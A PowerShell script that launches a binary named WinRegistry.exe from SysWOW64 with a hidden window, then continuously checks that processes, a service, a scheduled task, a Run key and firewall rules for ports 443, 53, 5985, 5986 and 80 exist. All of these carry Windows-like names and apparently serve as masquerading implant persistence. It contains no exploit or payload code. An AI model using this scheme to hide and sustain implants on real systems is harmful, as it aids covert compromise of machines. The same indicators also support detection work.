# ====================================================================
# PowerShell: Binary Launcher + Persistence Monitor (W/ Privilege Check)
# Uses Get-ProcessCount AND Get-ProcessPrivilegeDetails for process status.
# Checks Process Count, Service, Task, RunKey, and Firewall Rule
# ====================================================================

# New Parameter Block: Allows the user to choose whether to launch the binaries or just monitor.
param(
    [Parameter(Mandatory=$false)]
    [bool]$LaunchBinaries = $true
)

# --- 1. Define binaries to run ---
if ($LaunchBinaries) {
    $binaries = @(
        @{ Path = "C:\Windows\SysWOW64\WinRegistry.exe"; WorkingDirectory = "C:\Windows\SysWOW64\" }
    )

    Write-Host "Launching target binaries..." -ForegroundColor Cyan
    foreach ($binary in $binaries) {
        $filePath   = $binary.Path
        $workingDir = $binary.WorkingDirectory

        if (Test-Path -Path $filePath) {
            try {
                Start-Sleep -Seconds 2
                # Launch the process hidden
                Start-Process -FilePath $filePath -WorkingDirectory $workingDir -WindowStyle Hidden
                Write-Host "Executed $filePath" -ForegroundColor Green
            }
            catch {
                Write-Warning "Failed to execute $filePath - $($_.Exception.Message)"
            }
        }
        else {
            Write-Warning "Binary not found: $filePath"
        }
    }
} else {
    Write-Host "Skipping binary launch based on parameter setting." -ForegroundColor Yellow
}


# --- 2. Define items to check ---
$exesToCheck = @("Windows Session Monitor.exe", "WinRegistry.exe", "Windows Logging Services.exe")
$taskName    = "Registry Optimization"
$serviceName = "Windows Registry Initializer"
# Updated to an array of firewall rules to check
$firewallRules = @("Windows Server Manager Automated Firewall Rule - 443", "Windows Server Manager Automated Firewall Rule - 53", "Windows Server Manager Automated Firewall Rule - 5985", "Windows Server Manager Automated Firewall Rule - 5986", "Windows Server Manager Automated Firewall Rule - 80")
$runKeyName  = "Windows Registry Initializer"


# --- 3. Helper: Get process count (Simple check) ---
function Get-ProcessCount {
    param([string]$ProcessName)
    # Remove the .exe extension for Get-Process
    $procName = ($ProcessName -replace '.exe$', '')
    # Get processes by name and return the count
    $procs = Get-Process -Name $procName -ErrorAction SilentlyContinue
    return $procs.Count
}

# --- 3b. Helper: Get process details including user context/privilege level ---
function Get-ProcessPrivilegeDetails {
    param([string]$ProcessName)
    $procNameNoExe = ($ProcessName -replace '.exe$', '') # Get name without .exe extension
    
    # Get all running process objects that match the name
    $procs = Get-Process -ErrorAction SilentlyContinue | Where-Object {
        $_.ProcessName -eq $procNameNoExe
    }
    
    $results = @()

    foreach ($p in $procs) {
        $userContext = "Unknown"
        
        try {
            # Use Get-CimInstance to find the process ID and retrieve the owner
            $wmiProcess = Get-CimInstance -ClassName Win32_Process -Filter "ProcessId = $($p.Id)" -ErrorAction Stop
            $owner = $wmiProcess.GetOwner()
            
            if ($owner -and $owner.User) {
                $domain = $owner.Domain
                $userAccount = $owner.User
                
                # Infer privilege context based on the account name
                switch ("$domain\$userAccount") {
                    "NT AUTHORITY\SYSTEM" { $userContext = "SYSTEM (High)" }
                    "NT AUTHORITY\LocalService" { $userContext = "LocalService (Low)" }
                    "NT AUTHORITY\NetworkService" { $userContext = "NetworkService (Low)" }
                    default {
                        # For other users, display the user name
                        if ($userAccount -match "Administrator") {
                            $userContext = "$domain\$userAccount (Admin/High)"
                        } else {
                            $userContext = "$domain\$userAccount (User/Medium)"
                        }
                    }
                }
            }
        }
        catch {
            # This catch block is typically hit when a low-privilege script tries to query the owner of a SYSTEM process
            $userContext = "Access Denied (SYSTEM/High - Possible)"
        }

        $results += [PSCustomObject]@{
            Id          = $p.Id
            UserContext = $userContext
        }
    }
    return $results
}

# --- 4. Helper: Check if Scheduled Task exists & enabled ---
function Get-ScheduledTaskStatus {
    param([string]$TaskName)
    try {
        $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction Stop
        if ($task.State -eq "Disabled") { return "Disabled" }
        return "Enabled"
    }
    catch { return "Missing" }
}

# --- 5. Helper: Check if Run key exists ---
function Test-RunKey {
    param([string]$KeyName)
    $path = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
    try {
        $value = Get-ItemProperty -Path $path -Name $KeyName -ErrorAction Stop
        return $true
    }
    catch { return $false }
}

# --- 6. Helper: Check if Service exists & startup mode ---
function Get-ServiceStatus {
    param([string]$ServiceName)
    try {
        $svc = Get-Service -Name $ServiceName -ErrorAction Stop
        # Use WMI/CIM to get the StartMode which is not always available via Get-Service
        $startup = (Get-WmiObject -Class Win32_Service -Filter "Name='$ServiceName'").StartMode
        return @{ Exists = $true; Status = $svc.Status; StartMode = $startup }
    }
    catch {
        return @{ Exists = $false; Status = "Missing"; StartMode = "N/A" }
    }
}

# --- 7. Helper: Check if Firewall rule exists & enabled ---
function Get-FirewallRuleStatus {
    param([string]$RuleName)
    try {
        # Using netsh as it is sometimes more reliable for quick rule checks
        $rules = netsh advfirewall firewall show rule name="$RuleName" | Out-String
        if ($rules -match "No rules match") { return "Missing" }
        if ($rules -match "Enabled:\s*Yes") { return "Enabled" }
        else { return "Disabled" }
    }
    catch { return "Missing" }
}

# --- 8. Continuous monitoring loop ---
while ($true) {
    Clear-Host
    Write-Host "=== STATUS CHECK at $(Get-Date -Format 'HH:mm:ss') ===" -ForegroundColor Cyan
    Write-Host ""

    # --- Processes (Count and Privilege Check) ---
    Write-Host "=== Running Processes (Count and Privilege Check) ===" -ForegroundColor Yellow
    # Create a simplified formatted header
    Write-Host ("{0,-35} {1}" -f "PROCESS NAME", "COUNT") -ForegroundColor Yellow
    Write-Host ("{0,-35} {1}" -f "------------", "-----") -ForegroundColor Yellow

    foreach ($exe in $exesToCheck) {
        # Use the simple count function
        $count = Get-ProcessCount -ProcessName $exe
        
        if ($count -gt 0) {
            $statusText = "Running ($count instance(s))"
            Write-Host ("{0,-35} {1}" -f $exe, $statusText) -ForegroundColor Green
            
            # Use the new privilege function if processes are running
            $details = Get-ProcessPrivilegeDetails -ProcessName $exe
            
            # Display privilege details indented underneath the count
            foreach ($d in $details) {
                # Note: The 'Access Denied' message often implies SYSTEM/High privilege when run from a non-admin session
                $color = if ($d.UserContext -match "SYSTEM|Admin/High|Access Denied") { "DarkRed" } else { "DarkGreen" }
                Write-Host ("  -> PID {0,-8} Context: {1}" -f $d.Id, $d.UserContext) -ForegroundColor $color
            }
        } else {
            Write-Host ("{0,-35} {1}" -f $exe, "Not Running (0)") -ForegroundColor Red
        }
    }

    Write-Host ""
    Write-Host "=== Persistence Mechanisms ===" -ForegroundColor Yellow

    # --- Scheduled Task ---
    $taskStatus = Get-ScheduledTaskStatus -TaskName $taskName
    if ($taskStatus -eq "Enabled") {
        Write-Host "Scheduled Task '$taskName': Enabled" -ForegroundColor Green
    } elseif ($taskStatus -eq "Disabled") {
        Write-Host "Scheduled Task '$taskName': Disabled" -ForegroundColor Yellow
    } else {
        Write-Host "Scheduled Task '$taskName': Missing" -ForegroundColor Red
    }

    # --- Service ---
    $svc = Get-ServiceStatus -ServiceName $serviceName
    if ($svc.Exists) {
        $color = if ($svc.StartMode -eq "Auto") { "Green" } else { "Yellow" }
        Write-Host "Service '$serviceName': Exists, StartMode=$($svc.StartMode), Status=$($svc.Status)" -ForegroundColor $color
    } else {
        Write-Host "Service '$serviceName': Missing" -ForegroundColor Red
    }

    # --- Run Key ---
    $runKeyExists = Test-RunKey -KeyName $runKeyName
    if ($runKeyExists) {
        Write-Host "Run Key '$runKeyName': Present" -ForegroundColor Green
    } else {
        Write-Host "Run Key '$runKeyName': Missing" -ForegroundColor Red
    }

    # --- Firewall Rules ---
    foreach ($firewallRule in $firewallRules) {
        $fwStatus = Get-FirewallRuleStatus -RuleName $firewallRule
        switch ($fwStatus) {
            "Enabled"  { Write-Host "Firewall Rule '$firewallRule': Enabled" -ForegroundColor Green }
            "Disabled" { Write-Host "Firewall Rule '$firewallRule': Disabled" -ForegroundColor Yellow }
            "Missing"  { Write-Host "Firewall Rule '$firewallRule': Missing" -ForegroundColor Red }
        }
    }

    Write-Host ""
    Write-Host "Next check in 5 seconds..."
    Start-Sleep -Seconds 5
}
